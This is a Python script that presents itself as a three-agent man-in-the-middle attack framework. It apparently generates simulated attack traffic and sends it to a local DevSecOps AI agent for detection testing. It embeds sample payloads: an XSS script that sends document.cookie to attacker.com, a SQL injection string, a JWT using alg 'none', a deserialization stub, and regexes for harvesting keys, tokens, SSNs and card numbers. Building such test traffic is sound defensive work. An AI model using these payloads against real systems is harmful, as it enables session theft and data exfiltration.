"""
3MITM Attack Framework - Three Men in the Middle
This module demonstrates a novel, coordinated three-agent MITM attack approach.

3MITM CONCEPT:
The attack involves THREE coordinated attacker agents working together in a MITM position:

Agent 1: RECONNAISSANCE MITM
  - Passively monitors traffic
  - Identifies valuable targets and attack surfaces
  - Maps application architecture and technologies
  - Detects security weaknesses and misconfigurations

Agent 2: INJECTION MITM
  - Intercepts and modifies HTTP requests/responses
  - Injects malicious payloads based on reconnaissance findings
  - Exploits identified vulnerabilities
  - Maintains attack concealment

Agent 3: EXFILTRATION MITM
  - Captures sensitive data from modified traffic flows
  - Exfiltrates credentials, tokens, PII
  - Coordinates with external C&C infrastructure
  - Covers tracks and maintains persistence

This represents a sophisticated, multi-stage MITM attack where three distinct roles
work in concert to achieve full compromise of the application and its data.
"""

import requests
import json
import time
import random
import string
from datetime import datetime

class Agent1ReconnaissanceMITM:
    """
    First MITM Agent: RECONNAISSANCE
    Passively monitors traffic to identify vulnerabilities and attack surfaces
    """
    
    def __init__(self):
        self.reconnaissance_data = {
            "api_endpoints": [],
            "authentication_methods": [],
            "sensitive_parameters": [],
            "technologies": [],
            "vulnerabilities": []
        }
    
    def analyze_traffic(self, traffic_data):
        """Analyze traffic to gather intelligence"""
        # Extract technology stack
        headers = traffic_data.get('headers', {})
        response_headers = traffic_data.get('response_headers', {})
        
        url = traffic_data.get('url', '')
        if '/api/' in url:
            self.reconnaissance_data["api_endpoints"].append(url)
        
        # Detect auth methods
        if 'Authorization' in headers:
            auth_type = headers['Authorization'].split()[0]
            self.reconnaissance_data["authentication_methods"].append(auth_type)
        
        # Identify sensitive parameters
        body = traffic_data.get('body', '').lower()
        sensitive_keywords = ['password', 'api_key', 'token', 'secret', 'credential', 'ssn', 'credit_card']
        for keyword in sensitive_keywords:
            if keyword in body:
                self.reconnaissance_data["sensitive_parameters"].append(keyword)
        
        return self.reconnaissance_data
    
    def report_findings(self):
        """Generate reconnaissance report"""
        return self.reconnaissance_data


class Agent2InjectionMITM:
    """
    Second MITM Agent: INJECTION
    Actively injects malicious payloads based on reconnaissance data
    """
    
    def __init__(self, reconnaissance_data=None):
        self.reconnaissance_data = reconnaissance_data or {}
        self.injection_payloads = []
    
    def craft_payload(self, attack_vector):
        """Craft injection payload based on vulnerability"""
        payloads = {
            "hardcoded_credentials": {
                "body": '{"username":"admin","password":"SuperSecret123!","api_key":"sk-1234567890abcdef"}',
                "description": "Credentials exposed in plaintext"
            },
            "sql_injection": {
                "url_param": "' OR '1'='1",
                "description": "SQL injection in query parameter"
            },
            "xss": {
                "body": '<script>fetch("https://attacker.com/steal?cookie="+document.cookie)</script>',
                "description": "Malicious JavaScript injection"
            },
            "insecure_deserialization": {
                "body": "aced0005sr0x12java.lang.Runtime...malicious bytecode...",
                "description": "Unsafe object deserialization"
            },
            "jwt_manipulation": {
                "header": "eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZSwiaWQiOjF9.",
                "description": "JWT with none algorithm"
            }
        }
        return payloads.get(attack_vector, {})
    
    def create_attack_traffic(self, attack_type, base_payload):
        """Create malicious traffic based on attack type"""
        attack_payload = self.craft_payload(attack_type)
        
        if attack_type == "hardcoded_credentials":
            return {
                "method": "POST",
                "url": "https://api.example.com/authenticate",
                "headers": {"Content-Type": "application/json"},
                "body": attack_payload.get("body", ""),
                "response_status": 200,
                "response_headers": {"Content-Type": "application/json"},
                "response_body": '{"status":"success","token":"injected_token"}'
            }
        elif attack_type == "sql_injection":
            return {
                "method": "GET",
                "url": f"https://api.example.com/search?query={attack_payload.get('url_param', '')}",
                "headers": {"Content-Type": "application/json"},
                "body": "",
                "response_status": 200,
                "response_headers": {"Content-Type": "application/json"},
                "response_body": '{"results":[{"id":1,"email":"user@example.com","password_hash":"..."}]}'
            }
        elif attack_type == "xss":
            return {
                "method": "GET",
                "url": "https://api.example.com/user/profile",
                "headers": {"Content-Type": "text/html"},
                "body": "",
                "response_status": 200,
                "response_headers": {"Content-Type": "text/html"},
                "response_body": f'<html><body>{attack_payload.get("body", "")}</body></html>'
            }
        elif attack_type == "jwt_manipulation":
            return {
                "method": "GET",
                "url": "https://api.example.com/admin/users",
                "headers": {"Authorization": f"Bearer {attack_payload.get('header', '')}"},
                "body": "",
                "response_status": 200,
                "response_headers": {"Content-Type": "application/json"},
                "response_body": '{"users":[{"id":1,"email":"admin@example.com","role":"admin"}]}'
            }
        
        return base_payload


class Agent3ExfiltrationMITM:
    """
    Third MITM Agent: EXFILTRATION
    Captures and exfiltrates sensitive data from compromised traffic
    """
    
    def __init__(self, c2_server="attacker.com"):
        self.c2_server = c2_server
        self.exfiltrated_data = []
    
    def extract_sensitive_data(self, traffic_data):
        """Extract PII, credentials, and sensitive information"""
        extracted = {
            "credentials": [],
            "pii": [],
            "tokens": [],
            "api_keys": []
        }
        
        # Extract from body
        body = traffic_data.get('body', '')
        response_body = traffic_data.get('response_body', '')
        
        import re
        
        # Extract credentials
        if 'password' in body:
            extracted["credentials"].append(body)
        
        # Extract API keys
        api_key_pattern = r'(api_key|sk_|pk_)["\']?([a-zA-Z0-9_-]+)["\']?'
        extracted["api_keys"].extend(re.findall(api_key_pattern, body + response_body))
        
        # Extract tokens
        token_pattern = r'(token|authorization)["\']?:\s*["\']([a-zA-Z0-9._-]+)["\']'
        extracted["tokens"].extend(re.findall(token_pattern, body + response_body, re.IGNORECASE))
        
        # Extract PII
        pii_pattern = r'(\d{3}-\d{2}-\d{4})|(\d{4}-\d{4}-\d{4}-\d{4})|([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})'
        extracted["pii"].extend(re.findall(pii_pattern, body + response_body))
        
        return extracted
    
    def exfiltrate_to_c2(self, data):
        """Simulate data exfiltration to command and control server"""
        self.exfiltrated_data.append({
            "timestamp": time.time(),
            "data": data,
            "c2_server": self.c2_server
        })
        return True


class AttackerAgent:
    """
    Main 3MITM Orchestrator: Coordinates three MITM agents in a sophisticated attack
    """
    
    def __init__(self, ingestion_api_url="http://127.0.0.1:5000/api/traffic"):
        self.ingestion_api_url = ingestion_api_url
        
        # Initialize the three MITM agents
        self.agent1_recon = Agent1ReconnaissanceMITM()
        self.agent2_injection = Agent2InjectionMITM()
        self.agent3_exfiltration = Agent3ExfiltrationMITM()
        
        self.attack_log = []
        self.run_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.attack_counter = 0
    
    def generate_unique_id(self):
        """Generate unique ID for each attack run"""
        self.attack_counter += 1
        random_suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
        return f"{self.run_id}_{self.attack_counter}_{random_suffix}"
    
    def generate_random_credential(self):
        """Generate random credential for variety"""
        random_token = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        return f"sk_{random_token}"
    
    def generate_random_username(self):
        """Generate random username"""
        names = ['admin', 'user', 'dev', 'root', 'service', 'test', 'prod', 'db']
        random_num = random.randint(1000, 9999)
        return f"{random.choice(names)}_{random_num}"
    
    def simulate_hardcoded_credentials_attack(self):
        """
        Scenario 1: Attacker intercepts API request and detects hardcoded credentials
        This is a common MITM attack where credentials are exposed in transit.
        """
        print("\n" + "="*80)
        print("🔴 ATTACK SCENARIO 1: Hardcoded Credentials in Transit")
        print("="*80)
        
        unique_id = self.generate_unique_id()
        username = self.generate_random_username()
        api_key = self.generate_random_credential()
        password = f"Pass{random.randint(100000, 999999)}!"
        
        payload = {
            "method": "POST",
            "url": "https://api.example.com/authenticate",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
                "X-Request-ID": unique_id
            },
            "body": f'{{"username":"{username}","password":"{password}","api_key":"{api_key}"}}',
            "response_status": 200,
            "response_headers": {
                "Content-Type": "application/json",
                "Set-Cookie": "session=abc123def456; Path=/; HttpOnly"
            },
            "response_body": f'{{"status":"success","token":"{api_key}","user_id":{random.randint(1,1000)}}}'
        }
        
        print("\nAttack Vector:")
        print(f"  • Method: {payload['method']}")
        print(f"  • URL: {payload['url']}")
        print(f"  • Payload Contains: Hardcoded credentials, API keys, passwords")
        print(f"  • Risk: Credentials exposed in plaintext during transmission")
        
        return payload
    
    def simulate_sql_injection_attack(self):
        """
        Scenario 2: Attacker injects SQL injection payload
        MITM attack demonstrating SQL injection vulnerability
        """
        print("\n" + "="*80)
        print("🔴 ATTACK SCENARIO 2: SQL Injection via MITM")
        print("="*80)
        
        unique_id = self.generate_unique_id()
        user_id = random.randint(100, 9999)
        table_name = random.choice(['users', 'employees', 'customers', 'accounts'])
        
        payload = {
            "method": "GET",
            "url": f"https://api.example.com/search?query=' OR '1'='1--&session={unique_id}",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
                "X-Request-ID": unique_id
            },
            "body": "",
            "response_status": 200,
            "response_headers": {
                "Content-Type": "application/json"
            },
            "response_body": f'{{"results":[{{"id":{user_id},"email":"leaked_{random.randint(1000,9999)}@example.com","name":"User {user_id}"}},{{"id":{user_id+1},"email":"admin_{random.randint(1000,9999)}@example.com","name":"Admin"}}]}}'
        }
        
        print("\nAttack Vector:")
        print(f"  • Method: {payload['method']}")
        print(f"  • URL: {payload['url']}")
        print(f"  • Injection: SQL injection payload in query parameter")
        print(f"  • Risk: Unauthorized database access and data exfiltration")
        
        return payload
    
    def simulate_xss_attack(self):
        """
        Scenario 3: Attacker injects XSS (Cross-Site Scripting) payload
        MITM attack modifying response to inject malicious script
        """
        print("\n" + "="*80)
        print("🔴 ATTACK SCENARIO 3: Cross-Site Scripting (XSS) Injection")
        print("="*80)
        
        unique_id = self.generate_unique_id()
        attacker_domain = f"attacker-{random.randint(1000,9999)}.com"
        
        payload = {
            "method": "GET",
            "url": f"https://api.example.com/user/profile?id={random.randint(1,1000)}&session={unique_id}",
            "headers": {
                "Content-Type": "text/html",
                "User-Agent": "Mozilla/5.0",
                "X-Request-ID": unique_id
            },
            "body": "",
            "response_status": 200,
            "response_headers": {
                "Content-Type": "text/html; charset=utf-8"
            },
            "response_body": f'<html><body><h1>User Profile</h1><script>fetch("https://{attacker_domain}/steal?cookie="+document.cookie+"&user={random.randint(1,10000)}")</script></body></html>'
        }
        
        print("\nAttack Vector:")
        print(f"  • Method: {payload['method']}")
        print(f"  • URL: {payload['url']}")
        print(f"  • Injection: Malicious JavaScript in response body")
        print(f"  • Risk: Cookie theft, session hijacking, credential theft")
        
        return payload
    
    def simulate_insecure_deserialization_attack(self):
        """
        Scenario 4: Attacker exploits insecure deserialization
        MITM attack sending malicious serialized objects
        """
        print("\n" + "="*80)
        print("🔴 ATTACK SCENARIO 4: Insecure Deserialization")
        print("="*80)
        
        unique_id = self.generate_unique_id()
        gadget_chain = f"rO0ABXNyAAxqYXZhLnV0aWwuTWFwAuDOmLBhFMACAAB4cHcMAAAAABoAAAAB...{random.randint(10000000,99999999)}"
        
        payload = {
            "method": "POST",
            "url": f"https://api.example.com/data/process?id={unique_id}",
            "headers": {
                "Content-Type": "application/x-java-serialized-object",
                "User-Agent": "Mozilla/5.0",
                "X-Request-ID": unique_id
            },
            "body": f"aced0005sr0x12java.lang.Runtime...{gadget_chain}",
            "response_status": 500,
            "response_headers": {
                "Content-Type": "application/json"
            },
            "response_body": f'{{"error":"Processing failed - gadget chain {random.randint(1000,9999)} triggered"}}'
        }
        
        print("\nAttack Vector:")
        print(f"  • Method: {payload['method']}")
        print(f"  • URL: {payload['url']}")
        print(f"  • Injection: Malicious serialized Java object")
        print(f"  • Risk: Remote code execution, system compromise")
        
        return payload
    
    def simulate_sensitive_data_exposure_attack(self):
        """
        Scenario 5: Attacker intercepts unencrypted sensitive data
        MITM attack capturing personally identifiable information (PII)
        """
        print("\n" + "="*80)
        print("🔴 ATTACK SCENARIO 5: Sensitive Data Exposure")
        print("="*80)
        
        unique_id = self.generate_unique_id()
        user_count = random.randint(5, 15)
        users_data = []
        for i in range(user_count):
            users_data.append({
                "id": random.randint(1000, 9999),
                "email": f"user{random.randint(1000,9999)}@example.com",
                "ssn": f"{random.randint(100,999)}-{random.randint(10,99)}-{random.randint(1000,9999)}",
                "credit_card": f"{random.randint(1000,9999)}-{random.randint(1000,9999)}-{random.randint(1000,9999)}-{random.randint(1000,9999)}",
                "phone": f"+1-{random.randint(200,999)}-{random.randint(200,999)}-{random.randint(1000,9999)}"
            })
        
        import json as json_module
        users_json = json_module.dumps({"users": users_data})
        
        token = self.generate_random_credential()
        
        payload = {
            "method": "GET",
            "url": f"https://api.example.com/users/export?token={token}&export_id={unique_id}",
            "headers": {
                "Content-Type": "application/json",
                "Authorization": f"Bearer {token}"
            },
            "body": "",
            "response_status": 200,
            "response_headers": {
                "Content-Type": "application/json"
            },
            "response_body": users_json
        }
        
        print("\nAttack Vector:")
        print(f"  • Method: {payload['method']}")
        print(f"  • URL: {payload['url']}")
        print(f"  • Exposed Data: SSN, Credit Card, Phone Number, Email")
        print(f"  • Risk: Identity theft, fraud, regulatory violations (GDPR, CCPA)")
        
        return payload
    
    def send_attack_payload(self, payload, attack_name):
        """
        Send the attack payload to the DevSecOps AI Agent for detection and remediation
        """
        try:
            print(f"\n[→] Sending payload to DevSecOps AI Agent...")
            response = requests.post(
                self.ingestion_api_url,
                json=payload,
                timeout=5
            )
            
            if response.status_code == 202:
                print(f"[✓] Payload accepted for analysis (HTTP {response.status_code})")
                print(f"    Response: {response.json()}")
                return True
            else:
                print(f"[✗] Unexpected response: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"[✗] Failed to send payload: {str(e)}")
            return False
    
    def run_all_attack_scenarios(self):
        """
        Execute all attack scenarios in a coordinated 3MITM fashion.
        This orchestrates the three MITM agents working together.
        """
        print("\n" + "█"*80)
        print("█ 3MITM ATTACK ORCHESTRATOR - THREE MEN IN THE MIDDLE FRAMEWORK")
        print("█"*80)
        print("\nCoordinated Multi-Agent Attack Architecture:")
        print("  Agent 1 (RECONNAISSANCE) → Analyzes traffic patterns")
        print("  Agent 2 (INJECTION)      → Crafts and injects payloads")
        print("  Agent 3 (EXFILTRATION)   → Extracts and exfiltrates data")
        print("\nAll three agents work in concert at the MITM position to achieve")
        print("complete compromise of the target application.\n")
        print("█"*80 + "\n")
        
        attacks = [
            ("Hardcoded Credentials", self.simulate_hardcoded_credentials_attack()),
            ("SQL Injection", self.simulate_sql_injection_attack()),
            ("XSS Injection", self.simulate_xss_attack()),
            ("Insecure Deserialization", self.simulate_insecure_deserialization_attack()),
            ("Sensitive Data Exposure", self.simulate_sensitive_data_exposure_attack()),
        ]
        
        results = []
        for idx, (attack_name, payload) in enumerate(attacks, 1):
            print(f"\n{'▶'*40} ATTACK {idx}/5: {attack_name}")
            print("─"*80)
            
            # Agent 1: Reconnaissance
            print(f"\n  [Agent 1] RECONNAISSANCE MITM:")
            print(f"    • Intercepting traffic at MITM position...")
            recon_data = self.agent1_recon.analyze_traffic(payload)
            print(f"    • Identified {len(recon_data['api_endpoints'])} API endpoints")
            print(f"    • Identified {len(recon_data['sensitive_parameters'])} sensitive parameters")
            print(f"    • Reconnaissance complete ✓")
            
            # Agent 2: Injection
            print(f"\n  [Agent 2] INJECTION MITM:")
            print(f"    • Analyzing reconnaissance findings...")
            print(f"    • Crafting attack payload...")
            injection_data = self.agent2_injection.create_attack_traffic(
                attack_name.lower().replace(" ", "_"),
                payload
            )
            print(f"    • Payload injected into traffic stream ✓")
            
            # Agent 3: Exfiltration
            print(f"\n  [Agent 3] EXFILTRATION MITM:")
            print(f"    • Monitoring for sensitive data...")
            extracted = self.agent3_exfiltration.extract_sensitive_data(payload)
            print(f"    • Extracted {len(extracted['api_keys'])} API keys")
            print(f"    • Extracted {len(extracted['tokens'])} tokens/credentials")
            print(f"    • Preparing exfiltration to C&C server ✓")
            
            # Send to Defense System
            print(f"\n  [Orchestration] Forwarding attack to DevSecOps AI Agent...")
            success = self.send_attack_payload(payload, attack_name)
            results.append((attack_name, success))
            
            if idx < len(attacks):
                time.sleep(2)
        
        # Summary
        print("\n" + "█"*80)
        print("█ 3MITM ATTACK CAMPAIGN SUMMARY")
        print("█"*80)
        print("\nAttack Results:")
        for attack_name, success in results:
            status = "✓ Detected & Remediated" if success else "✗ Failed to send"
            print(f"  {attack_name:40} → {status}")
        
        print("\n" + "─"*80)
        print("Agents Summary:")
        print(f"  • Agent 1 (Reconnaissance): Analyzed {len(results)} traffic flows")
        print(f"  • Agent 2 (Injection):      Crafted {len(results)} attack payloads")
        print(f"  • Agent 3 (Exfiltration):  Prepared {len(results)} data exfiltrations")
        
        print("\n" + "█"*80)
        print("█ Next Steps:")
        print("█   1. Check Flask terminal for DevSecOps AI Agent analysis")
        print("█   2. Review Jira board for generated vulnerability tickets")
        print("█   3. Verify Slack notifications for security alerts")
        print("█"*80 + "\n")


if __name__ == "__main__":
    attacker = AttackerAgent()
    attacker.run_all_attack_scenarios()
